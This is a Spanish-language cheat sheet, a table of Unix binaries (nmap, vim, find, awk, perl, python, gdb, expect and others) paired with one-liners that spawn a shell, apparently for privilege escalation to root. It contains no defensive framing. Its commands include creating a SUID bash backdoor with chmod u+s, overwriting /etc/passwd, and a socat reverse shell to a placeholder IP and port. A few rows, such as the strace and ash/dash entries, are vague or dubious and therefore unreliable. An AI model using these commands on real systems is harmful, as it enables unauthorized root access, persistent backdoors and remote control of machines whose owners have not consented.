
|Binario|Comando para Explotar|Descripción|
|---|---|---|
|nmap|`nmap --interactive` → luego `!sh`|Útil en versiones <5.0|
|vim|`vim` → teclear: `:!sh`|Shell interactiva|
|find|`find . -exec /bin/sh \; -quit`|Ejecuta sh en contexto root|
|less|`less /etc/passwd` → Teclear `!'sh'`|Invoca shell|
|more|`more /etc/passwd` → Teclear `!'sh'`|Similar a `less`|
|awk|`awk 'BEGIN {system("/bin/sh")}'`|Arranca shell|
|perl|`perl -e 'exec "/bin/sh";'`|Ejecución del shell|
|python|`python -c "import os; os.execl('/bin/sh', 'sh')"`|Crea nueva instancia del shell|
|python3|`python3 -c "import os; os.execl('/bin/sh', 'sh')"`|Alternativa moderna|
|gcc|Compilar script.c que lance `/bin/sh`|Ejecutar binario compilado|
|gdb|`gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh")' -ex quit`|Shell desde python dentro de GDB|
|strace|`strace -o /dev/null /bin/sh`|Saltarse protecciones|
|cp|Copiar `/bin/bash` a carpeta + set suid (`chmod u+s`)|Crear nuevo binario backdoor|
|mount|Montar imagen tmpfs/fuse con datos modificables|Acceso indirecto a FS|
|passwd|(Muy raro) Sobreescribir `/etc/passwd`|Riesgo por mal manejo de archivos|
|wget|Descargar archivo modificado de `/etc/passwd`, remplazar|Manipulación indirecta|
|curl|`curl file:///etc/passwd` → leer/guardar/modificar contenido|Posible reemplazo crítico|
|env|`env /bin/sh`|Ignora entorno existente, arranca `/bin/sh`|
|ash|`/bin/ash`|Shell alternativo|
|dash|`/bin/dash`|Lo mismo|
|expect|`expect -c 'spawn sh;interact'`|Shell con spawn|
|socat|`socat exec:'/bin/sh',pty,stderr tcp-connect:<IP>:<PUERTO>`|Shell reversa|